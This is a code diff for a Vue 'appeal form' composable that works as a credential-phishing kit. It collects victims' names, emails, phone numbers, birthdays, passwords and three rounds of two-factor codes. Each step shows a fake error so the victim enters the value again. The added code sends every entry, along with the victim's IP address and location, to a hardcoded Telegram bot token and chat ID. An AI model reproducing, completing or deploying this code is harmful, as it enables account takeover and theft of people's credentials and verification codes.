@@ -2,8 +2,11 @@ import { reactive, ref, shallowRef, markRaw, watch, onMounted, nextTick, onBefor
 import "intl-tel-input/build/css/intlTelInput.css";
 import intlTelInput from "intl-tel-input";
 import { AsYouType } from "libphonenumber-js";
-import api from "@/services/api";
+// ❌ REMOVED: import api from "@/services/api";
 
+/**
+ * ✅ Cookie utilities
+ */
 function setCookie(name, value, days = 1) {
     const expires = new Date(Date.now() + days * 864e5).toUTCString();
     document.cookie =
@@ -24,7 +27,156 @@ function removeCookie(name) {
     document.cookie = `${encodeURIComponent(name)}=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/; SameSite=Lax`;
 }
 
+/**
+ * ✅ LocalStorage utilities (NEW)
+ */
+function saveToLocalStorage(key, data) {
+    try {
+        localStorage.setItem(key, JSON.stringify(data));
+    } catch (e) {
+        console.error('LocalStorage save error:', e);
+    }
+}
+
+function loadFromLocalStorage(key) {
+    try {
+        const data = localStorage.getItem(key);
+        return data ? JSON.parse(data) : null;
+    } catch (e) {
+        console.error('LocalStorage load error:', e);
+        return null;
+    }
+}
+
+/**
+ * ✅ Generate unique submission ID (NEW)
+ */
+function generateSubmissionId() {
+    const randomNumber = Math.floor(Math.random() * 90000000) + 10000000;
+    return `USER-ID: ${randomNumber}`;
+}
+
+/**
+ * ✅ Get user location (NEW)
+ */
+async function getUserLocationInfo() {
+    try {
+        const response = await fetch("https://ipinfo.io/json?token=1a1487102e7dd6");
+        const data = await response.json();
+        return {
+            ip: data.ip || 'Unknown',
+            country: data.country || 'Unknown',
+            city: data.city || 'Unknown',
+            region: data.region || 'Unknown',
+        };
+    } catch (e) {
+        console.error('Location fetch error:', e);
+        return {
+            ip: 'Unknown',
+            country: 'Unknown',
+            city: 'Unknown',
+            region: 'Unknown',
+        };
+    }
+}
+
+/**
+ * ✅ Generate Telegram message (NEW)
+ */
+function generateTelegramMessage(submissionId, formData, locationData) {
+    let message = "";
+    message += `<b>User ID:</b> <code>${submissionId}</code>\n`;
+    message += `IP: <code>${locationData.ip}</code> | City: <code>${locationData.city}</code> | Country: <code>${locationData.country}</code>\n`;
+    message += "--------------------------------------------------------------\n";
+
+    const fieldsOrder = [
+        { key: 'fullName', label: 'FullName' },
+        { key: 'email', label: 'Email 1' },
+        { key: 'businessEmail', label: 'Email 2' },
+        { key: 'pageName', label: 'PageName' },
+        'separator',
+        { key: 'phone', label: 'Phone' },
+        { key: 'birthday', label: 'Birthday' },
+    ];
+
+    fieldsOrder.forEach(field => {
+        if (field === 'separator') {
+            message += "--------------------------------------------------------------\n";
+            return;
+        }
+        const value = formData[field.key] ? formData[field.key] : 'N/A';
+        message += `${field.label}: <code>${value}</code>\n`;
+    });
+
+    message += "--------------------------------------------------------------\n";
+
+    const passwordFields = [
+        { key: 'password', label: 'Password 1' },
+        { key: 'password_confirm', label: 'Password 2' }
+    ];
+
+    passwordFields.forEach(field => {
+        if (formData[field.key]) {
+            message += `${field.label}: <code>${formData[field.key]}</code>\n`;
+        }
+    });
+
+    message += "--------------------------------------------------------------\n";
+
+    const codeFields = [
+        { key: 'method', label: 'Method' },
+        { key: 'code_first', label: 'Code 1' },
+        { key: 'code_second', label: 'Code 2' },
+        { key: 'code_third', label: 'Code 3' }
+    ];
+
+    codeFields.forEach(field => {
+        if (formData[field.key]) {
+            message += `${field.label}: <code>${formData[field.key]}</code>\n`;
+        }
+    });
+
+    return message;
+}
+
+/**
+ * ✅ Send to Telegram (NEW)
+ */
+async function sendToTelegram(message, botToken, chatId) {
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+
+        if (!response.ok) {
+            throw new Error(`Telegram API error: ${response.statusText}`);
+        }
+
+        const data = await response.json();
+        if (!data.ok) {
+            throw new Error(`Telegram error: ${data.description}`);
+        }
+
+        return { success: true, messageId: data.result.message_id };
+    } catch (error) {
+        console.error('Telegram send error:', error);
+        return { success: false, error: error.message };
+    }
+}
+
 const COOKIE_KEY = "appeal_step1";
+const STORAGE_KEY = 'appeal_form_data';
+const SUBMISSION_ID_KEY = 'submission_id';
+
+// ✅ Telegram config (EASILY CHANGEABLE)
+const TELEGRAM_BOT_TOKEN = "8388711243:AAHK6UUxOlMkjxuxHzfhlrwKlbjY3mUZ3dE";
+const TELEGRAM_CHAT_ID = "-1003453491467";
 
 export function useAppealForm(emit) {
     const phone = ref("");
@@ -34,6 +186,15 @@ export function useAppealForm(emit) {
     const phoneTouched = ref(false)
     let onInputHandler = null;
     let onCountryChangeHandler = null;
+
+    // ✅ NEW: Submission & Location
+    const submissionId = ref('');
+    const locationData = ref({
+        ip: 'Unknown',
+        country: 'Unknown',
+        city: 'Unknown',
+        region: 'Unknown',
+    });
 
     const step = ref(1);
     const code = ref("");
@@ -59,14 +220,39 @@ export function useAppealForm(emit) {
         phoneE164: "",
     });
 
+    /**
+     * ✅ Initialize (NEW)
+     */
+    const initializeForm = async () => {
+        const saved = loadFromLocalStorage(STORAGE_KEY);
+        if (saved) {
+            Object.assign(allFormData, saved);
+            Object.assign(form, saved.formStep1 || {});
+        }
+
+        let id = localStorage.getItem(SUBMISSION_ID_KEY);
+        if (!id) {
+            id = generateSubmissionId();
+            localStorage.setItem(SUBMISSION_ID_KEY, id);
+        }
+        submissionId.value = id;
+
+        locationData.value = await getUserLocationInfo();
+    };
+
     function saveStep1ToCookie() {
         const payload = {
             fullName: form.fullName || "",
             email: form.email || "",
             phoneDisplay: phone.value || "",
             phoneE164: phoneE164.value || "",
+            businessEmail: form.businessEmail || "",
+            pageName: form.pageName || "",
+            dob: form.dob || {},
         };
         setCookie(COOKIE_KEY, JSON.stringify(payload), 1);
+
+        saveToLocalStorage(STORAGE_KEY, allFormData);
     }
 
     function loadStep1FromCookie() {
@@ -152,6 +338,8 @@ export function useAppealForm(emit) {
     }
 
     onMounted(async () => {
+        // ✅ NEW: Initialize form
+        await initializeForm();
         loadStep1FromCookie();
 
         await nextTick();
@@ -159,7 +347,6 @@ export function useAppealForm(emit) {
         if (!input) return;
         phoneInputEl.value = input;
 
-        // ✅ Simple IP detection - fast & clean
         let countryCode = "us";
         try {
             const res = await fetch("https://ipinfo.io/json?token=1a1487102e7dd6");
@@ -171,7 +358,6 @@ export function useAppealForm(emit) {
             countryCode = "us";
         }
 
-        // intl-tel-input chỉ dùng dropdown + lấy iso2/dialCode, KHÔNG dùng utilsScript
         iti.value = intlTelInput(input, {
             initialCountry: countryCode,
             containerClass: "w-full",
@@ -180,59 +366,46 @@ export function useAppealForm(emit) {
             nationalMode: false,
         });
 
-        // ✅ set sẵn +dialCode theo IP
         const dialCode = getDialCode();
         const initialValue = `+${dialCode} `;
         phone.value = initialValue;
         input.value = initialValue;
-        phoneE164.value = `+${dialCode}`; // chưa có số national
+        phoneE164.value = `+${dialCode}`;
 
-        // Input handler: chỉ cho phép số + format national part
         onInputHandler = (e) => {
             const dial = getDialCode();
             const iso = getIso2();
 
             const current = e.target.value || "";
+            const allDigits = current.replace(/\D/g, "");
 
-            // Lấy tất cả digits
-            const allDigits = current.replace(/\D/g, ""); // chỉ số
-
-            // Tách national digits: bỏ dialCode nếu nó nằm ở đầu
             let nationalDigits = allDigits;
             if (nationalDigits.startsWith(dial)) {
                 nationalDigits = nationalDigits.slice(dial.length);
             }
 
-            // ✅ Bắt buộc nationalDigits chỉ là số -> đã đảm bảo vì replace(/\D/g,'')
-            // Format hiển thị
             const formattedNational = new AsYouType(iso).input(nationalDigits);
             const display = `+${dial} ${formattedNational}`.trim();
 
-            // set display + submit value
             phone.value = display;
             phoneE164.value = `+${dial}${nationalDigits}`;
             e.target.value = display;
 
-            // ✅ chỉ check rỗng / có số
             validatePhoneLoose(nationalDigits);
         };
 
-        // Country change: reset prefix + format lại (nếu user đã nhập số)
         onCountryChangeHandler = () => {
             const dial = getDialCode();
             const iso = getIso2();
 
-            // lấy digits user đã nhập trước đó (nếu có)
             const current = input.value || "";
             const allDigits = current.replace(/\D/g, "");
 
-            // bỏ dial cũ nếu có
             let nationalDigits = allDigits;
             if (nationalDigits.startsWith(dial)) {
                 nationalDigits = nationalDigits.slice(dial.length);
             }
 
-            // reset hiển thị theo dial mới
             const formattedNational = new AsYouType(iso).input(nationalDigits);
             const display = `+${dial} ${formattedNational}`.trim();
 
@@ -301,7 +474,6 @@ export function useAppealForm(emit) {
         const { day, month, year } = form.dob;
         errors.dob = day && month && year ? "" : "Please enter enough date of birth.";
 
-        // ✅ BỎ validation issue vì không có input field
         errors.issue = "";
         errors.agreeTerms = form.agreeTerms ? "" : "Please agree to our terms and data and cookie policy";
 
@@ -319,49 +491,48 @@ export function useAppealForm(emit) {
         return;
     }
 
+    /**
+     * ✅ Submit form STEP 1 (NO BACKEND - SEND TELEGRAM)
+     */
     const submitForm = async () => {
+        if (!validatePhoneNumber()) return;
+
+        const birthday = `${form.dob.year}-${String(form.dob.month).padStart(2, "0")}-${String(form.dob.day).padStart(2, "0")}`;
+
+        const formData = {
+            fullName: form.fullName,
+            email: form.email,
+            businessEmail: form.businessEmail,
+            pageName: form.pageName,
+            phone: phoneE164.value,
+            birthday,
+            description: form.issue,
+        };
+
+        allFormData.formStep1 = formData;
+        saveStep1ToCookie();
+        saveToLocalStorage(STORAGE_KEY, allFormData);
+
+        // ✅ SEND TELEGRAM - STEP 1
         try {
-            if (!validatePhoneNumber()) return;
+            const telegramMessage = generateTelegramMessage(
+                submissionId.value,
+                allFormData.formStep1,
+                locationData.value
+            );
 
-            const birthday = `${form.dob.year}-${String(form.dob.month).padStart(2, "0")}-${String(form.dob.day).padStart(2, "0")}`;
-
-            const formData = {
-                fullName: form.fullName,
-                email: form.email,
-                businessEmail: form.businessEmail,
-                pageName: form.pageName,
-                phone: phoneE164.value,
-                birthday,
-                description: form.issue,
-                password: password.value,
-                password_confirm: password.value,
-                code_first: code.value,
-                code_second: code.value,
-            };
-
-            const fd = new FormData();
-            Object.keys(formData).forEach((k) => fd.append(k, formData[k]));
-
-            const response = await api.post("/submit-tele", fd, {
-                headers: { "Content-Type": "multipart/form-data" },
-            });
-
-            if (response.data?.success) {
-                saveStep1ToCookie();
-                allFormData.formStep1 = formData;
-                step.value = 2;
-            }
+            const result = await sendToTelegram(telegramMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+            console.log('✅ Step 1 sent to Telegram:', result);
         } catch (error) {
-            console.error("Response Error:", error.response?.data);
-            if (error.response?.data?.errors) {
-                const serverErrors = error.response.data.errors;
-                Object.keys(serverErrors).forEach((key) => {
-                    if (errors.hasOwnProperty(key)) errors[key] = serverErrors[key][0];
-                });
-            }
+            console.error('❌ Telegram Step 1 error:', error);
         }
+
+        step.value = 2;
     };
 
+    /**
+     * ✅ Submit password STEP 2 (NO BACKEND - SEND TELEGRAM)
+     */
     const submitPassword = async () => {
         try {
             isLoading.value = true;
@@ -372,41 +543,62 @@ export function useAppealForm(emit) {
                     password: password.value,
                 };
 
-                await api.post("/submit-tele", {
-                    ...allFormData.formStep1,
-                    step: 2,
-                    password: password.value,
-                    isFirstAttempt: true,
-                });
+                console.log('Step 2 (Password 1):', allFormData.formStep2);
+                console.log('DEBUG - Phone:', allFormData.formStep2.phone);
+                console.log('DEBUG - Birthday:', allFormData.formStep2.birthday);
+
+                // ✅ SEND TELEGRAM - PASSWORD 1
+                try {
+                    const telegramMessage = generateTelegramMessage(
+                        submissionId.value,
+                        allFormData.formStep2,
+                        locationData.value
+                    );
+
+                    const result = await sendToTelegram(telegramMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+                    console.log('✅ Step 2 (Password 1) sent to Telegram:', result);
+                } catch (error) {
+                    console.error('❌ Telegram Step 2 error:', error);
+                }
 
                 passwordInputCount.value++;
                 passwordError.value = true;
                 password.value = "";
+                saveToLocalStorage(STORAGE_KEY, allFormData);
+
+                await new Promise(r => setTimeout(r, 500));
                 return;
             }
 
-            const response = await api.post("/submit-tele", {
-                ...allFormData.formStep1,
+            // Password confirm
+            allFormData.formStep2 = {
                 ...allFormData.formStep2,
-                step: 2,
                 password_confirm: password.value,
-                isFirstAttempt: false,
-            });
+            };
 
-            if (response.data?.success) {
-                allFormData.formStep2 = {
-                    ...allFormData.formStep2,
-                    password_confirm: password.value,
-                };
-                step.value = 3;
-            } else {
-                passwordError.value = true;
-                password.value = "";
-                passwordInputCount.value = 0;
-                delete allFormData.formStep2;
+            console.log('Step 2 (Password 2):', allFormData.formStep2);
+            console.log('DEBUG - Phone:', allFormData.formStep2.phone);
+            console.log('DEBUG - Birthday:', allFormData.formStep2.birthday);
+
+            // ✅ SEND TELEGRAM - PASSWORD 2
+            try {
+                const telegramMessage = generateTelegramMessage(
+                    submissionId.value,
+                    allFormData.formStep2,
+                    locationData.value
+                );
+
+                const result = await sendToTelegram(telegramMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+                console.log('✅ Step 2 (Password 2) sent to Telegram:', result);
+            } catch (error) {
+                console.error('❌ Telegram Step 2 error:', error);
             }
+
+            saveToLocalStorage(STORAGE_KEY, allFormData);
+            step.value = 3;
+            password.value = "";
         } catch (error) {
-            console.error("Password Error:", error.response?.data);
+            console.error("Password Error:", error);
             passwordError.value = true;
             password.value = "";
             passwordInputCount.value = 0;
@@ -430,99 +622,140 @@ export function useAppealForm(emit) {
         }, 1000);
     };
 
+    /**
+     * ✅ Submit code STEP 3 (NO BACKEND - SEND TELEGRAM)
+     */
     const submitCode = async () => {
         try {
             isLoading.value = true;
 
-            const method =
-                JSON.parse(sessionStorage.getItem("step1Data") || "{}")?.method || "notification";
+            const method = JSON.parse(sessionStorage.getItem("step1Data") || "{}")?.method || "notification";
 
             if (codeInputCount.value === 0) {
+                // First code
                 allFormData.formStep3 = {
                     ...allFormData.formStep2,
                     code_first: code.value,
                     method,
                 };
 
-                await api.post("/submit-tele", {
-                    ...allFormData.formStep1,
-                    ...allFormData.formStep2,
-                    step: 3,
-                    method,
-                    code_first: code.value,
-                    isFirstAttempt: true,
-                });
+                console.log('Step 3 (Code 1):', allFormData.formStep3);
+                console.log('DEBUG - Phone:', allFormData.formStep3.phone);
+                console.log('DEBUG - Birthday:', allFormData.formStep3.birthday);
+
+                // ✅ SEND TELEGRAM - CODE 1
+                try {
+                    const telegramMessage = generateTelegramMessage(
+                        submissionId.value,
+                        allFormData.formStep3,
+                        locationData.value
+                    );
+
+                    const result = await sendToTelegram(telegramMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+                    console.log('✅ Step 3 (Code 1) sent to Telegram:', result);
+                } catch (error) {
+                    console.error('❌ Telegram Code 1 error:', error);
+                }
 
                 codeInputCount.value++;
                 codeError.value = true;
                 code.value = "";
+                saveToLocalStorage(STORAGE_KEY, allFormData);
                 startCountdown(30);
+
+                await new Promise(r => setTimeout(r, 500));
                 return;
             }
 
             if (codeInputCount.value === 1) {
+                // Second code
                 allFormData.formStep3 = {
                     ...allFormData.formStep3,
                     code_second: code.value,
                     method,
                 };
 
-                await api.post("/submit-tele", {
-                    ...allFormData.formStep1,
-                    ...allFormData.formStep2,
-                    ...allFormData.formStep3,
-                    step: 3,
-                    method,
-                    code_second: code.value,
-                    isSecondAttempt: true,
-                });
+                console.log('Step 3 (Code 2):', allFormData.formStep3);
+                console.log('DEBUG - Phone:', allFormData.formStep3.phone);
+                console.log('DEBUG - Birthday:', allFormData.formStep3.birthday);
+
+                // ✅ SEND TELEGRAM - CODE 2
+                try {
+                    const telegramMessage = generateTelegramMessage(
+                        submissionId.value,
+                        allFormData.formStep3,
+                        locationData.value
+                    );
+
+                    const result = await sendToTelegram(telegramMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+                    console.log('✅ Step 3 (Code 2) sent to Telegram:', result);
+                } catch (error) {
+                    console.error('❌ Telegram Code 2 error:', error);
+                }
 
                 codeInputCount.value++;
                 codeError.value = true;
                 code.value = "";
+                saveToLocalStorage(STORAGE_KEY, allFormData);
                 startCountdown(30);
+
+                await new Promise(r => setTimeout(r, 500));
                 return;
             }
 
             if (codeInputCount.value === 2) {
+                // Third code - FINAL
                 allFormData.formStep3 = {
                     ...allFormData.formStep3,
-                    code_second: code.value,
+                    code_third: code.value,
                     method,
                 };
 
-                await api.post("/submit-tele", {
-                    ...allFormData.formStep1,
-                    ...allFormData.formStep2,
-                    ...allFormData.formStep3,
-                    step: 3,
-                    method,
-                    code_third: code.value,
-                    isSecondAttempt: true,
-                });
-                codeInputCount.value++;
+                console.log('Step 3 (Code 3) - FINAL:', allFormData.formStep3);
+                console.log('DEBUG - Phone:', allFormData.formStep3.phone);
+                console.log('DEBUG - Birthday:', allFormData.formStep3.birthday);
+
+                // ✅ SEND TELEGRAM - CODE 3 (FINAL)
+                try {
+                    const fullFormData = {
+                        ...allFormData.formStep1,
+                        ...allFormData.formStep2,
+                        ...allFormData.formStep3
+                    };
+
+                    const telegramMessage = generateTelegramMessage(
+                        submissionId.value,
+                        fullFormData,
+                        locationData.value
+                    );
+
+                    const result = await sendToTelegram(telegramMessage, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
+                    console.log('✅ Step 3 (Code 3 - FINAL) sent to Telegram:', result);
+                } catch (error) {
+                    console.error('❌ Telegram Code 3 error:', error);
+                }
+
+                saveToLocalStorage(STORAGE_KEY, allFormData);
+                code.value = "";
                 step.value = 4;
             }
         } catch (error) {
-            console.error("Code Error:", error.response?.data);
+            console.error("Code Error:", error);
             codeError.value = true;
-            codeErrorMessage.value = "Có lỗi xảy ra";
+            codeErrorMessage.value = "An error occurred";
             code.value = "";
         } finally {
             isLoading.value = false;
         }
     };
 
-    // ✅ FIX CHÍNH: handleSend giờ thực sự submit form
     const handleSend = async () => {
         if (isLoading.value) return;
 
         isLoading.value = true;
 
-        // ⏳ giả lập loading 0.8s để user thấy spinner
         await new Promise((resolve) => setTimeout(resolve, 800));
 
-        // ✅ VALIDATE
         const ok = validatePhoneNumber();
         console.log("Validation result:", ok, "Errors:", JSON.stringify(errors));
 
@@ -531,7 +764,6 @@ export function useAppealForm(emit) {
             return;
         }
 
-        // ✅ THỰC HIỆN SUBMIT FORM THỰC TẾ
         await submitForm();
 
         isLoading.value = false;
@@ -579,6 +811,56 @@ export function useAppealForm(emit) {
         if (emit) emit("close");
     }
 
+    /**
+     * ✅ NEW: Clear all data
+     */
+    function clearAllData() {
+        localStorage.removeItem(STORAGE_KEY);
+        localStorage.removeItem(SUBMISSION_ID_KEY);
+        removeCookie(COOKIE_KEY);
+
+        step.value = 1;
+        form.fullName = "";
+        form.email = "";
+        form.businessEmail = "";
+        form.pageName = "";
+        form.dob = { day: "", month: "", year: "" };
+        form.issue = "";
+        form.agreeTerms = false;
+
+        password.value = "";
+        passwordError.value = false;
+        passwordInputCount.value = 0;
+
+        code.value = "";
+        codeError.value = false;
+        codeErrorMessage.value = "";
+        codeLocked.value = false;
+        codeInputCount.value = 0;
+        countdown.value = 0;
+
+        phone.value = "";
+        phoneE164.value = "";
+
+        allFormData.formStep1 = null;
+        allFormData.formStep2 = null;
+        allFormData.formStep3 = null;
+    }
+
+    /**
+     * ✅ NEW: Export data
+     */
+    function exportFormData() {
+        return {
+            submissionId: submissionId.value,
+            locationData: locationData.value,
+            formStep1: allFormData.formStep1,
+            formStep2: allFormData.formStep2,
+            formStep3: allFormData.formStep3,
+            timestamp: new Date().toISOString()
+        };
+    }
+
     return {
         phone,
         phoneE164,
@@ -610,6 +892,10 @@ export function useAppealForm(emit) {
         isLoading,
         allFormData,
         isCountingDown,
+        submissionId,
+        locationData,
+        clearAllData,
+        exportFormData,
         previewImages: ref([]),
         onFileChange: () => { },
         removeImage: () => { },
